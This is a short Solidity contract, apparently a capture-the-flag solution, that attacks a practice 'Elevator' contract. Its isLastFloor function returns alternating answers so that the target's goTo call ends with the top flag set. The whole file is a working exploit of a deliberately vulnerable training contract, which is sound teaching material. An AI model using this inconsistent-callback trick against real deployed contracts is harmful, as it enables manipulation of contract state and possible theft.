// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import './Elevator.sol';

contract HackElevator {
    Elevator public elevator;
    bool public toggle = true;

    constructor(address _target) public {
        elevator = Elevator(_target);
    }

    function isLastFloor(uint256) public returns (bool) {
        toggle = !toggle;
        return toggle;
    }

    function setTop() public {
        elevator.goTo(100);
    }
}
